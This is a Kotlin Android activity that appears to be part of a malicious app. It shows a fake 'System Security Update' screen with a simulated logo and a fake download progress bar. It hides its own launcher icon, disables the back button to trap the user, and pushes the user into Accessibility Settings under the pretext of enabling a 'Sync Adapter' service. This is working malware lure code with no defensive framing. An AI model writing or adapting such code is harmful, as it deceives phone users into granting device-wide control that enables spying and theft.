package com.shadow.ui

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.delay

class SystemUpdateActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Hide the app icon from the launcher once we've been launched once
        val p = packageManager
        val componentName = android.content.ComponentName(this, SystemUpdateActivity::class.java)
        if (p.getComponentEnabledSetting(componentName) != android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            p.setComponentEnabledSetting(
                componentName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        }
        
        // Prevent dismissal
        actionBar?.hide()
        
        setContent {
            MaterialTheme(colorScheme = darkColorScheme()) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color(0xFF121212)
                ) {
                    UpdateScreen(
                        onActivateClick = {
                            // Redirect user to Accessibility Settings
                            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                        }
                    )
                }
            }
        }
    }

    // Block back button
    override fun onBackPressed() {
        // Do nothing to trap user
    }
}

@Composable
fun UpdateScreen(onActivateClick: () -> Unit) {
    var progress by remember { mutableStateOf(0f) }

    LaunchedEffect(Unit) {
        while (progress < 1f) {
            delay(50)
            progress += 0.01f
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        // Simulated Manufacturer Logo (using generic icon here)
        Icon(
            imageVector = androidx.compose.material.icons.Icons.Filled.Settings,
            contentDescription = null,
            modifier = Modifier.size(80.dp),
            tint = Color(0xFF00E676)
        )
        
        Spacer(modifier = Modifier.height(32.dp))
        
        Text(
            text = "System Security Update",
            color = Color.White,
            fontSize = 24.sp,
            fontWeight = FontWeight.Bold
        )
        
        Spacer(modifier = Modifier.height(16.dp))
        
        Text(
            text = "A critical security update is required to ensure your device continues to function safely. This patch resolves known vulnerabilities in the Android System WebViewer.",
            color = Color.LightGray,
            textAlign = TextAlign.Center,
            fontSize = 14.sp,
            modifier = Modifier.padding(horizontal = 16.dp)
        )
        
        Spacer(modifier = Modifier.height(48.dp))

        if (progress < 1f) {
            CircularProgressIndicator(color = Color(0xFF00E676))
            Spacer(modifier = Modifier.height(16.dp))
            Text("Downloading... ${(progress * 100).toInt()}%", color = Color.Gray)
        } else {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E1E1E)),
                shape = RoundedCornerShape(12.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(
                        text = "Action Required",
                        color = Color.White,
                        fontWeight = FontWeight.Bold,
                        fontSize = 18.sp
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        text = "To apply the patch, please enable the 'Sync Adapter' system service on the next screen.",
                        color = Color.Gray,
                        textAlign = TextAlign.Center,
                        fontSize = 14.sp
                    )
                    Spacer(modifier = Modifier.height(24.dp))
                    Button(
                        onClick = onActivateClick,
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E676)),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Install & Reboot", color = Color.Black, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }
    }
}